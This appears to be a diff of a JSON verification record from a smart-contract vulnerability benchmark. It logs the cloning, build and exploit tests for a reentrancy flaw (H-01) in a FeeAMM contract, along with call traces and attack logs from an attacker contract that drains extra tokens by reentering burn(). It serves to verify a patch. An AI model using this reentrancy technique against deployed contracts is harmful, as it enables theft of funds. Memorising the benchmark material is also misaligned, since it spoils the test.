@@ -1,9 +1,169 @@
 {
+  "all_exploits_blocked_on_fixed": true,
+  "base_commit": "9ca5a9a49f6e129e9f65b2d1aab8728ac9f5e482",
   "candidate_id": "reevmbench:audits/2026-01-tempo-feeamm",
-  "command": null,
-  "exit_code": null,
-  "forge_status": "no_foundry_project",
-  "generated_at": "2026-11-20T09:44:58Z",
+  "clone": {
+    "attempts": [
+      {
+        "command": null,
+        "exit_code": 0,
+        "stderr_tail": "",
+        "stdout_tail": "",
+        "step": "reuse_existing_clone"
+      },
+      {
+        "command": "\"C:\\Program Files\\Git\\cmd\\git.EXE\" -C C:\\Users\\REDACTED\\Downloads\\vlun-data-main\\vlun-data-main\\work\\wave1_runs\\reevmbench\\reevmbench__audits__2026-01-tempo-feeamm\\checkout config core.longpaths true",
+        "exit_code": 0,
+        "stderr_tail": "",
+        "stdout_tail": "",
+        "step": "git_config_longpaths",
+        "timed_out": false,
+        "tool_missing": false
+      },
+      {
+        "command": "\"C:\\Program Files\\Git\\cmd\\git.EXE\" -C C:\\Users\\REDACTED\\Downloads\\vlun-data-main\\vlun-data-main\\work\\wave1_runs\\reevmbench\\reevmbench__audits__2026-01-tempo-feeamm\\checkout rev-parse HEAD",
+        "exit_code": 0,
+        "stderr_tail": "",
+        "stdout_tail": "9ca5a9a49f6e129e9f65b2d1aab8728ac9f5e482\n",
+        "step": "rev_parse_head",
+        "timed_out": false,
+        "tool_missing": false
+      },
+      {
+        "command": "\"C:\\Program Files\\Git\\cmd\\git.EXE\" -C C:\\Users\\REDACTED\\Downloads\\vlun-data-main\\vlun-data-main\\work\\wave1_runs\\reevmbench\\reevmbench__audits__2026-01-tempo-feeamm\\checkout cat-file -t 9ca5a9a49f6e129e9f65b2d1aab8728ac9f5e482",
+        "exit_code": 0,
+        "stderr_tail": "",
+        "stdout_tail": "commit\n",
+        "step": "cat_file_commit",
+        "timed_out": false,
+        "tool_missing": false
+      },
+      {
+        "command": "\"C:\\Program Files\\Git\\cmd\\git.EXE\" -C C:\\Users\\REDACTED\\Downloads\\vlun-data-main\\vlun-data-main\\work\\wave1_runs\\reevmbench\\reevmbench__audits__2026-01-tempo-feeamm\\checkout checkout --quiet --force --detach 9ca5a9a49f6e129e9f65b2d1aab8728ac9f5e482",
+        "exit_code": 0,
+        "stderr_tail": "",
+        "stdout_tail": "",
+        "step": "git_checkout_commit",
+        "timed_out": false,
+        "tool_missing": false
+      }
+    ],
+    "checked_out_commit": "9ca5a9a49f6e129e9f65b2d1aab8728ac9f5e482",
+    "destination": "C:\\Users\\REDACTED\\Downloads\\vlun-data-main\\vlun-data-main\\work\\wave1_runs\\reevmbench\\reevmbench__audits__2026-01-tempo-feeamm\\checkout",
+    "head": "9ca5a9a49f6e129e9f65b2d1aab8728ac9f5e482",
+    "ok": true,
+    "requested_commit": "9ca5a9a49f6e129e9f65b2d1aab8728ac9f5e482",
+    "url": "https://github.com/evmbench-org/2026-01-tempo-feeamm.git"
+  },
+  "clone_urls_attempted": [
+    "https://github.com/evmbench-org/2026-01-tempo-feeamm.git",
+    "https://github.com/evmbench-org/2026-01-tempo-feeamm-findings.git",
+    "https://github.com/code-423n4/2026-01-tempo-feeamm.git",
+    "https://github.com/code-423n4/2026-01-tempo-feeamm-findings.git"
+  ],
+  "command": "C:\\Users\\REDACTED\\foundry\\forge.EXE build --root C:\\Users\\REDACTED\\Downloads\\vlun-data-main\\vlun-data-main\\work\\wave1_runs\\reevmbench\\reevmbench__audits__2026-01-tempo-feeamm\\checkout",
+  "commands": [
+    "C:\\Users\\REDACTED\\foundry\\forge.EXE build --root C:\\Users\\REDACTED\\Downloads\\vlun-data-main\\vlun-data-main\\work\\wave1_runs\\reevmbench\\reevmbench__audits__2026-01-tempo-feeamm\\checkout",
+    "C:\\Users\\REDACTED\\foundry\\forge.EXE test --root C:\\Users\\REDACTED\\Downloads\\vlun-data-main\\vlun-data-main\\work\\wave1_runs\\reevmbench\\reevmbench__audits__2026-01-tempo-feeamm\\checkout --match-test testReentrancyBurnDrain -vvv",
+    "C:\\Users\\REDACTED\\foundry\\forge.EXE test --root C:\\Users\\REDACTED\\Downloads\\vlun-data-main\\vlun-data-main\\work\\wave1_runs\\reevmbench\\reevmbench__audits__2026-01-tempo-feeamm\\fixed --match-test testReentrancyBurnDrain -vvv"
+  ],
+  "config_summary": {
+    "base_commit": "9ca5a9a49f6e129e9f65b2d1aab8728ac9f5e482",
+    "default_test_flags": null,
+    "framework": "foundry",
+    "id": "2026-01-tempo-feeamm",
+    "run_cmd_dir": null,
+    "vulnerabilities_total": 1,
+    "vulnerabilities_with_tests": 1
+  },
+  "exit_code": 0,
+  "exit_codes": [
+    0,
+    0,
+    1
+  ],
+  "fixed": {
+    "build": {
+      "command": "C:\\Users\\REDACTED\\foundry\\forge.EXE build --root C:\\Users\\REDACTED\\Downloads\\vlun-data-main\\vlun-data-main\\work\\wave1_runs\\reevmbench\\reevmbench__audits__2026-01-tempo-feeamm\\fixed",
+      "exit_code": 0,
+      "stderr_tail": "orge/linting/erc20-unchecked-transfer\n\nwarning[erc20-unchecked-transfer]: ERC20 `transfer` or `transferFrom` call does not check the return value\n    â•­â–¸ contracts/FeeAMM.sol:163:9\n    â”‚\n163 â”‚         IERC20(userToken).transfer(to, amountOut);\n    â”‚         â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�\n    â”‚\n    â•° help: https://getfoundry.sh/forge/linting/erc20-unchecked-transfer\n\nwarning[reentrancy-no-eth]: external call can be reentered before `totalSupply` is updated\n    â•­â–¸ contracts/FeeAMM.sol:206:9\n    â”‚\n206 â”‚ â”�         IERC20(validatorToken).transferFrom(\n207 â”‚ â”ƒ             msg.sender,\n208 â”‚ â”ƒ             address(this),\n209 â”‚ â”ƒ             amountValidatorToken\n210 â”‚ â”ƒ         );\n    â”‚ â”—â”�â”�â”�â”�â”�â”�â”�â”�â”�â”›\n    â”‚\n    â•° help: https://getfoundry.sh/forge/linting/reentrancy-no-eth\n\nwarning[reentrancy-events]: event emitted after an external call; reentrancy can reorder or fabricate logs that off-chain consumers rely on\n    â•­â–¸ contracts/FeeAMM.sol:217:9\n    â”‚\n217 â”‚ â”�         emit Mint(\n218 â”‚ â”ƒ             msg.sender,\n219 â”‚ â”ƒ             to,\n220 â”‚ â”ƒ             userToken,\n    â€¡ â”ƒ\n223 â”‚ â”ƒ             liquidity\n224 â”‚ â”ƒ         );\n    â”‚ â”—â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”›\n    â”‚\n    â•° help: https://getfoundry.sh/forge/linting/reentrancy-events\n\nwarning[erc20-unchecked-transfer]: ERC20 `transfer` or `transferFrom` call does not check the return value\n    â•­â–¸ contracts/FeeAMM.sol:206:9\n    â”‚\n206 â”‚ â”�         IERC20(validatorToken).transferFrom(\n207 â”‚ â”ƒ             msg.sender,\n208 â”‚ â”ƒ             address(this),\n209 â”‚ â”ƒ             amountValidatorToken\n210 â”‚ â”ƒ         );\n    â”‚ â”—â”�â”�â”�â”�â”�â”�â”�â”�â”�â”›\n    â”‚\n    â•° help: https://getfoundry.sh/forge/linting/erc20-unchecked-transfer\n\nwarning[unsafe-typecast]: typecast can truncate values\n    â•­â–¸ contracts/FeeAMM.sol:212:39\n    â”‚\n212 â”‚         pool.reserveValidatorToken += uint128(amountValidatorToken);\n    â”‚                                       â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�\n    â”‚\n    â”œ note: consider disabling this lint if you're certain the cast is safe\n    â”‚       \n    â”‚       // casting to 'uint128' is safe because [explain why]\n    â”‚       // forge-lint: disable-next-line(unsafe-typecast)\n    â”‚       \n    â”‚       \n    â•° help: https://getfoundry.sh/forge/linting/unsafe-typecast\n\nwarning[missing-zero-check]: address parameter is used in a state write or value transfer without a zero-address check\n    â•­â–¸ contracts/FeeAMM.sol:228:9\n    â”‚\n228 â”‚         address userToken,\n    â”‚         â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�\n    â”‚\n    â•° help: https://getfoundry.sh/forge/linting/missing-zero-check\n\nwarning[missing-zero-check]: address parameter is used in a state write or value transfer without a zero-address check\n    â•­â–¸ contracts/FeeAMM.sol:229:9\n    â”‚\n229 â”‚         address validatorToken,\n    â”‚         â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�\n    â”‚\n    â•° help: https://getfoundry.sh/forge/linting/missing-zero-check\n\nwarning[reentrancy-events]: event emitted after an external call; reentrancy can reorder or fabricate logs that off-chain consumers rely on\n    â•­â–¸ contracts/FeeAMM.sol:263:9\n    â”‚\n263 â”‚ â”�         emit Burn(\n264 â”‚ â”ƒ             msg.sender,\n265 â”‚ â”ƒ             userToken,\n266 â”‚ â”ƒ             validatorToken,\n    â€¡ â”ƒ\n270 â”‚ â”ƒ             to\n271 â”‚ â”ƒ         );\n    â”‚ â”—â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”›\n    â”‚\n    â•° help: https://getfoundry.sh/forge/linting/reentrancy-events\n\nwarning[unsafe-typecast]: typecast can truncate values\n    â•­â–¸ contracts/FeeAMM.sol:256:34\n    â”‚\n256 â”‚         pool.reserveUserToken -= uint128(amountUserToken);\n    â”‚                                  â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�\n    â”‚\n    â”œ note: consider disabling this lint if you're certain the cast is safe\n    â”‚       \n    â”‚       // casting to 'uint128' is safe because [explain why]\n    â”‚       // forge-lint: disable-next-line(unsafe-typecast)\n    â”‚       \n    â”‚       \n    â•° help: https://getfoundry.sh/forge/linting/unsafe-typecast\n\nwarning[unsafe-typecast]: typecast can truncate values\n    â•­â–¸ contracts/FeeAMM.sol:257:39\n    â”‚\n257 â”‚         pool.reserveValidatorToken -= uint128(amountValidatorToken);\n    â”‚                                       â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�\n    â”‚\n    â”œ note: consider disabling this lint if you're certain the cast is safe\n    â”‚       \n    â”‚       // casting to 'uint128' is safe because [explain why]\n    â”‚       // forge-lint: disable-next-line(unsafe-typecast)\n    â”‚       \n    â”‚       \n    â•° help: https://getfoundry.sh/forge/linting/unsafe-typecast\n\nwarning[erc20-unchecked-transfer]: ERC20 `transfer` or `transferFrom` call does not check the return value\n    â•­â–¸ contracts/FeeAMM.sol:260:9\n    â”‚\n260 â”‚         IERC20(userToken).transfer(to, amountUserToken);\n    â”‚         â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�\n    â”‚\n    â•° help: https://getfoundry.sh/forge/linting/erc20-unchecked-transfer\n\nwarning[erc20-unchecked-transfer]: ERC20 `transfer` or `transferFrom` call does not check the return value\n    â•­â–¸ contracts/FeeAMM.sol:261:9\n    â”‚\n261 â”‚         IERC20(validatorToken).transfer(to, amountValidatorToken);\n    â”‚         â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�\n    â”‚\n    â•° help: https://getfoundry.sh/forge/linting/erc20-unchecked-transfer\n\n",
+      "stdout_tail": "Compiling 27 files with Solc 0.8.28\nSolc 0.8.28 finished in 1.69s\nCompiler run successful!\n",
+      "timed_out": false,
+      "tool_missing": false
+    },
+    "dependency_install": null,
+    "forge_status": "test_failed",
+    "project_root": "C:\\Users\\REDACTED\\Downloads\\vlun-data-main\\vlun-data-main\\work\\wave1_runs\\reevmbench\\reevmbench__audits__2026-01-tempo-feeamm\\fixed",
+    "tests": [
+      {
+        "command": "C:\\Users\\REDACTED\\foundry\\forge.EXE test --root C:\\Users\\REDACTED\\Downloads\\vlun-data-main\\vlun-data-main\\work\\wave1_runs\\reevmbench\\reevmbench__audits__2026-01-tempo-feeamm\\fixed --match-test testReentrancyBurnDrain -vvv",
+        "exit_code": 1,
+        "exploit_success": false,
+        "failed": true,
+        "passed": false,
+        "ran": true,
+        "rpc_indicated": true,
+        "stderr_tail": "",
+        "stdout_tail": "1A820a], MockTIP20: [0x2e234DAe75C793f67A35089C9d99245E1C58470b]) [staticcall]\n    â”‚   â”‚   â”‚   â”‚   â”‚   â””â”€ â†� [Return] 0xf62cdf7bdad8785279fa65348cb18dc7d679ba833143a899563381507557b31d\n    â”‚   â”‚   â”‚   â”‚   â”œâ”€ [1078] FeeAMM::liquidityBalances(0xf62cdf7bdad8785279fa65348cb18dc7d679ba833143a899563381507557b31d, ReentrancyAttacker: [0x959951c51b3e4B4eaa55a13D1d761e14Ad0A1d6a]) [staticcall]\n    â”‚   â”‚   â”‚   â”‚   â”‚   â””â”€ â†� [Return] 39970022483 [3.997e10]\n    â”‚   â”‚   â”‚   â”‚   â”œâ”€ [48755] FeeAMM::burn(MaliciousTIP20: [0xF62849F9A0B5Bf2913b396098F7c7019b51A820a], MockTIP20: [0x2e234DAe75C793f67A35089C9d99245E1C58470b], 9992505620 [9.992e9], ReentrancyAttacker: [0x959951c51b3e4B4eaa55a13D1d761e14Ad0A1d6a])\n    â”‚   â”‚   â”‚   â”‚   â”‚   â”œâ”€ [4281] MaliciousTIP20::transfer(ReentrancyAttacker: [0x959951c51b3e4B4eaa55a13D1d761e14Ad0A1d6a], 9084714966 [9.084e9])\n    â”‚   â”‚   â”‚   â”‚   â”‚   â”‚   â”œâ”€ emit Transfer(from: FeeAMM: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], to: ReentrancyAttacker: [0x959951c51b3e4B4eaa55a13D1d761e14Ad0A1d6a], amount: 9084714966 [9.084e9])\n    â”‚   â”‚   â”‚   â”‚   â”‚   â”‚   â””â”€ â†� [Return] true\n    â”‚   â”‚   â”‚   â”‚   â”‚   â”œâ”€ [30545] MockTIP20::transfer(ReentrancyAttacker: [0x959951c51b3e4B4eaa55a13D1d761e14Ad0A1d6a], 10928912104 [1.092e10])\n    â”‚   â”‚   â”‚   â”‚   â”‚   â”‚   â”œâ”€ emit Transfer(from: FeeAMM: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], to: ReentrancyAttacker: [0x959951c51b3e4B4eaa55a13D1d761e14Ad0A1d6a], amount: 10928912104 [1.092e10])\n    â”‚   â”‚   â”‚   â”‚   â”‚   â”‚   â””â”€ â†� [Return] true\n    â”‚   â”‚   â”‚   â”‚   â”‚   â”œâ”€ emit Burn(sender: ReentrancyAttacker: [0x959951c51b3e4B4eaa55a13D1d761e14Ad0A1d6a], userToken: MaliciousTIP20: [0xF62849F9A0B5Bf2913b396098F7c7019b51A820a], validatorToken: MockTIP20: [0x2e234DAe75C793f67A35089C9d99245E1C58470b], amountUserToken: 9084714966 [9.084e9], amountValidatorToken: 10928912104 [1.092e10], liquidity: 9992505620 [9.992e9], to: ReentrancyAttacker: [0x959951c51b3e4B4eaa55a13D1d761e14Ad0A1d6a])\n    â”‚   â”‚   â”‚   â”‚   â”‚   â””â”€ â†� [Return] 9084714966 [9.084e9], 10928912104 [1.092e10]\n    â”‚   â”‚   â”‚   â”‚   â””â”€ â†� [Stop]\n    â”‚   â”‚   â”‚   â””â”€ â†� [Return] true\n    â”‚   â”‚   â”œâ”€ [3845] MockTIP20::transfer(ReentrancyAttacker: [0x959951c51b3e4B4eaa55a13D1d761e14Ad0A1d6a], 10928912104 [1.092e10])\n    â”‚   â”‚   â”‚   â”œâ”€ emit Transfer(from: FeeAMM: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], to: ReentrancyAttacker: [0x959951c51b3e4B4eaa55a13D1d761e14Ad0A1d6a], amount: 10928912104 [1.092e10])\n    â”‚   â”‚   â”‚   â””â”€ â†� [Return] true\n    â”‚   â”‚   â”œâ”€ emit Burn(sender: ReentrancyAttacker: [0x959951c51b3e4B4eaa55a13D1d761e14Ad0A1d6a], userToken: MaliciousTIP20: [0xF62849F9A0B5Bf2913b396098F7c7019b51A820a], validatorToken: MockTIP20: [0x2e234DAe75C793f67A35089C9d99245E1C58470b], amountUserToken: 9084714966 [9.084e9], amountValidatorToken: 10928912104 [1.092e10], liquidity: 9992505620 [9.992e9], to: ReentrancyAttacker: [0x959951c51b3e4B4eaa55a13D1d761e14Ad0A1d6a])\n    â”‚   â”‚   â””â”€ â†� [Return] 9084714966 [9.084e9], 10928912104 [1.092e10]\n    â”‚   â””â”€ â†� [Stop]\n    â”œâ”€ [26339] MaliciousTIP20::disarm()\n    â”‚   â””â”€ â†� [Stop]\n    â”œâ”€ [16810] ReentrancyAttacker::getBalances() [staticcall]\n    â”‚   â”œâ”€ [2873] MaliciousTIP20::balanceOf(ReentrancyAttacker: [0x959951c51b3e4B4eaa55a13D1d761e14Ad0A1d6a]) [staticcall]\n    â”‚   â”‚   â””â”€ â†� [Return] 18169429932 [1.816e10]\n    â”‚   â”œâ”€ [2850] MockTIP20::balanceOf(ReentrancyAttacker: [0x959951c51b3e4B4eaa55a13D1d761e14Ad0A1d6a]) [staticcall]\n    â”‚   â”‚   â””â”€ â†� [Return] 21857824208 [2.185e10]\n    â”‚   â””â”€ â†� [Return] 18169429932 [1.816e10], 21857824208 [2.185e10]\n    â”œâ”€ [2514] MaliciousTIP20::reentrancyCount() [staticcall]\n    â”‚   â””â”€ â†� [Return] 1\n    â”œâ”€ [2492] ReentrancyAttacker::successfulReentries() [staticcall]\n    â”‚   â””â”€ â†� [Return] 1\n    â”œâ”€ [2510] ReentrancyAttacker::sawLiquidityUnchanged() [staticcall]\n    â”‚   â””â”€ â†� [Return] false\n    â”œâ”€ [2562] ReentrancyAttacker::reentrantSucceeded() [staticcall]\n    â”‚   â””â”€ â†� [Return] true\n    â”œâ”€ [0] console::log(\"\\n=== Attack Results ===\") [staticcall]\n    â”‚   â””â”€ â†� [Stop]\n    â”œâ”€ [0] console::log(\"Reentrancy attempts:\", 1) [staticcall]\n    â”‚   â””â”€ â†� [Stop]\n    â”œâ”€ [0] console::log(\"Successful reentries:\", 1) [staticcall]\n    â”‚   â””â”€ â†� [Stop]\n    â”œâ”€ [0] console::log(\"Malicious tokens received:\", 18169429932 [1.816e10]) [staticcall]\n    â”‚   â””â”€ â†� [Stop]\n    â”œâ”€ [0] console::log(\"Validator tokens received:\", 21857824208 [2.185e10]) [staticcall]\n    â”‚   â””â”€ â†� [Stop]\n    â”œâ”€ [0] console::log(\"Saw unchanged liquidity:\", false) [staticcall]\n    â”‚   â””â”€ â†� [Stop]\n    â”œâ”€ [0] console::log(\"Reentrant burn succeeded:\", true) [staticcall]\n    â”‚   â””â”€ â†� [Stop]\n    â”œâ”€ [0] VM::assertTrue(false, \"Reentrant burn should succeed with stale liquidity in vulnerable code\") [staticcall]\n    â”‚   â””â”€ â†� [Revert] Reentrant burn should succeed with stale liquidity in vulnerable code\n    â””â”€ â†� [Revert] Reentrant burn should succeed with stale liquidity in vulnerable code\n\nBacktrace:\n  at VM.assertTrue\n  at ExploitH01Test.testReentrancyBurnDrain\n\nSuite result: FAILED. 0 passed; 1 failed; 0 skipped; finished in 1.93ms (900.10Âµs CPU time)\n\nRan 1 test suite in 9.55ms (1.93ms CPU time): 0 tests passed, 1 failed, 0 skipped (1 total tests)\n\nFailing tests:\nEncountered 1 failing test in test/ExploitH01.t.sol:ExploitH01Test\n[FAIL: Reentrant burn should succeed with stale liquidity in vulnerable code] testReentrancyBurnDrain() (gas: 2226965)\n\nEncountered a total of 1 failing tests, 0 tests succeeded\n\nTip: Run `forge test --rerun` to retry only the 1 failed test\nTip: Run `forge test --debug --match-test <TEST_NAME>` to inspect one failing test in the debugger\n",
+        "test_name": "testReentrancyBurnDrain",
+        "timed_out": false,
+        "tool_missing": false,
+        "vulnerability": "H-01"
+      }
+    ],
+    "verification_level": "L4"
+  },
+  "fixed_sha": "fb1ef517ef6c225cf88f9712722e275deb816a88",
+  "fixed_sha_basis": "git_blob_of_patched_sources",
+  "fixed_source_paths": [
+    "contracts/FeeAMM.sol"
+  ],
+  "fixed_workspace": {
+    "copy": {
+      "destination": "C:\\Users\\REDACTED\\Downloads\\vlun-data-main\\vlun-data-main\\work\\wave1_runs\\reevmbench\\reevmbench__audits__2026-01-tempo-feeamm\\fixed",
+      "method": "copytree",
+      "ok": true,
+      "source": "C:\\Users\\REDACTED\\Downloads\\vlun-data-main\\vlun-data-main\\work\\wave1_runs\\reevmbench\\reevmbench__audits__2026-01-tempo-feeamm\\checkout"
+    },
+    "diff_applications": [],
+    "notes": [
+      "applied fixed source contracts/FeeAMM.sol for H-01"
+    ],
+    "patch_sources": [
+      {
+        "copied": true,
+        "destination": "contracts/FeeAMM.sol",
+        "source": "C:\\Users\\REDACTED\\Downloads\\vlun-data-main\\vlun-data-main\\work\\sources\\blocksecteam__ReEVMBench\\audits\\2026-01-tempo-feeamm\\patch\\FeeAMM.sol",
+        "vulnerability": "H-01"
+      }
+    ],
+    "project_root": "C:\\Users\\REDACTED\\Downloads\\vlun-data-main\\vlun-data-main\\work\\wave1_runs\\reevmbench\\reevmbench__audits__2026-01-tempo-feeamm\\fixed",
+    "test_installation": [
+      {
+        "copied": true,
+        "destination": "test/ExploitH01.t.sol",
+        "source": "C:\\Users\\REDACTED\\Downloads\\vlun-data-main\\vlun-data-main\\work\\sources\\blocksecteam__ReEVMBench\\audits\\2026-01-tempo-feeamm\\test\\ExploitH01.t.sol"
+      }
+    ],
+    "workspace": "C:\\Users\\REDACTED\\Downloads\\vlun-data-main\\vlun-data-main\\work\\wave1_runs\\reevmbench\\reevmbench__audits__2026-01-tempo-feeamm\\fixed"
+  },
+  "forge_status": "patch_verified_L6",
+  "generated_at": "2026-11-20T10:29:22Z",
+  "harness_listing": [
+    "config.yaml",
+    "Dockerfile",
+    "findings/gold_audit.md",
+    "findings/H-01.md",
+    "findings/incorrect/high/H-01.md",
+    "findings/incorrect/injection/H-01.md",
+    "findings/incorrect/low/H-01.md",
+    "patch/FeeAMM.sol",
+    "patch/low_hints.md",
+    "patch/med_hints.md",
+    "patch/patch_hints.md",
+    "patch_harness.json",
+    "test/ExploitH01.t.sol"
+  ],
   "harness_path": "audits/2026-01-tempo-feeamm",
   "input_row": {
     "c4_refs": [
@@ -21,12 +181,57 @@
     "source": "reevmbench",
     "tx_hash": ""
   },
-  "notes": [
-    "Harness dir has neither foundry.toml nor src/; it is a metadata harness. Verbatim top-level entries: Dockerfile, config.yaml, findings, findings/H-01.md, findings/gold_audit.md, findings/incorrect, findings/incorrect/high, findings/incorrect/high/H-01.md, findings/incorrect/injection, findings/incorrect/injection/H-01.md, findings/incorrect/low, findings/incorrect/low/H-01.md, patch, patch/FeeAMM.sol, patch/low_hints.md, patch/med_hints.md, patch/patch_hints.md, patch_harness.json, test, test/ExploitH01.t.sol"
+  "l6_pairs": [
+    {
+      "fixed": "FAIL",
+      "test_name": "testReentrancyBurnDrain",
+      "vulnerable": "PASS"
+    }
   ],
-  "pinned_commit": "af878a75d628599736c78e8fe9655a57b041206e",
-  "retrieved_at": "2026-11-20T09:44:58Z",
+  "notes": [],
+  "project_root": "C:\\Users\\REDACTED\\Downloads\\vlun-data-main\\vlun-data-main\\work\\wave1_runs\\reevmbench\\reevmbench__audits__2026-01-tempo-feeamm\\checkout",
+  "retrieved_at": "2026-11-20T10:29:15Z",
+  "source_checkout": "C:\\Users\\REDACTED\\Downloads\\vlun-data-main\\vlun-data-main\\work\\wave1_runs\\reevmbench\\reevmbench__audits__2026-01-tempo-feeamm\\checkout",
   "stderr_tail": "",
-  "stdout_tail": "",
-  "verification_level": "L0"
+  "stdout_tail": "No files changed, compilation skipped\n\nRan 1 test for test/ExploitH01.t.sol:ExploitH01Test\n[PASS] testReentrancyBurnDrain() (gas: 2219054)\nLogs:\n  === Initial Pool State ===\n  Pool reserveUserToken: 500000000000\n  Pool reserveValidatorToken: 501500000000\n  \n  === Attacker Setup ===\n  Attacker liquidity tokens: 49962528103\n  \n  === Expected (Fair) Output ===\n  Expected userToken for single burn: 9084714966\n  Expected validatorToken for single burn: 10928912104\n  \n  === Executing Reentrancy Attack ===\n  \n  === Attack Results ===\n  Reentrancy attempts: 1\n  Successful reentries: 1\n  Malicious tokens received: 18169429932\n  Validator tokens received: 21857824208\n  Saw unchanged liquidity: true\n  Reentrant burn succeeded: true\n  \n  === Exploit Verification ===\n  Expected for single burn: 10928912104\n  Expected with reentrancy: 21857824208\n  Actually received: 21857824208\n  \n  === EXPLOIT SUCCESSFUL ===\n  H-01 Reentrancy vulnerability confirmed!\n  Attacker extracted more tokens than entitled by reentering burn()\n\nSuite result: ok. 1 passed; 0 failed; 0 skipped; finished in 2.09ms (984.60Âµs CPU time)\n\nRan 1 test suite in 4.31ms (2.09ms CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)\n",
+  "test_installation": [
+    {
+      "copied": true,
+      "destination": "test/ExploitH01.t.sol",
+      "source": "C:\\Users\\REDACTED\\Downloads\\vlun-data-main\\vlun-data-main\\work\\sources\\blocksecteam__ReEVMBench\\audits\\2026-01-tempo-feeamm\\test\\ExploitH01.t.sol"
+    }
+  ],
+  "toolchain_note": "forge=available; anvil=available; cast=available; cached_forge_std=MISSING",
+  "verification_level": "L6",
+  "vulnerable": {
+    "build": {
+      "command": "C:\\Users\\REDACTED\\foundry\\forge.EXE build --root C:\\Users\\REDACTED\\Downloads\\vlun-data-main\\vlun-data-main\\work\\wave1_runs\\reevmbench\\reevmbench__audits__2026-01-tempo-feeamm\\checkout",
+      "exit_code": 0,
+      "stderr_tail": "eth\n\nwarning[reentrancy-events]: event emitted after an external call; reentrancy can reorder or fabricate logs that off-chain consumers rely on\n    â•­â–¸ contracts/FeeAMM.sol:218:9\n    â”‚\n218 â”‚ â”�         emit Mint(\n219 â”‚ â”ƒ             msg.sender,\n220 â”‚ â”ƒ             to,\n221 â”‚ â”ƒ             userToken,\n    â€¡ â”ƒ\n224 â”‚ â”ƒ             liquidity\n225 â”‚ â”ƒ         );\n    â”‚ â”—â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”›\n    â”‚\n    â•° help: https://getfoundry.sh/forge/linting/reentrancy-events\n\nwarning[erc20-unchecked-transfer]: ERC20 `transfer` or `transferFrom` call does not check the return value\n    â•­â–¸ contracts/FeeAMM.sol:207:9\n    â”‚\n207 â”‚ â”�         IERC20(validatorToken).transferFrom(\n208 â”‚ â”ƒ             msg.sender,\n209 â”‚ â”ƒ             address(this),\n210 â”‚ â”ƒ             amountValidatorToken\n211 â”‚ â”ƒ         );\n    â”‚ â”—â”�â”�â”�â”�â”�â”�â”�â”�â”�â”›\n    â”‚\n    â•° help: https://getfoundry.sh/forge/linting/erc20-unchecked-transfer\n\nwarning[unsafe-typecast]: typecast can truncate values\n    â•­â–¸ contracts/FeeAMM.sol:213:39\n    â”‚\n213 â”‚         pool.reserveValidatorToken += uint128(amountValidatorToken);\n    â”‚                                       â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�\n    â”‚\n    â”œ note: consider disabling this lint if you're certain the cast is safe\n    â”‚       \n    â”‚       // casting to 'uint128' is safe because [explain why]\n    â”‚       // forge-lint: disable-next-line(unsafe-typecast)\n    â”‚       \n    â”‚       \n    â•° help: https://getfoundry.sh/forge/linting/unsafe-typecast\n\nwarning[reentrancy-no-eth]: external call can be reentered before `liquidityBalances` is updated\n    â•­â–¸ contracts/FeeAMM.sol:254:9\n    â”‚\n254 â”‚         IERC20(userToken).transfer(to, amountUserToken);\n    â”‚         â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�\n    â”‚\n    â•° help: https://getfoundry.sh/forge/linting/reentrancy-no-eth\n\nwarning[reentrancy-no-eth]: external call can be reentered before `liquidityBalances` is updated\n    â•­â–¸ contracts/FeeAMM.sol:255:9\n    â”‚\n255 â”‚         IERC20(validatorToken).transfer(to, amountValidatorToken);\n    â”‚         â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�\n    â”‚\n    â•° help: https://getfoundry.sh/forge/linting/reentrancy-no-eth\n\nwarning[missing-zero-check]: address parameter is used in a state write or value transfer without a zero-address check\n    â•­â–¸ contracts/FeeAMM.sol:230:9\n    â”‚\n230 â”‚         address validatorToken,\n    â”‚         â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�\n    â”‚\n    â•° help: 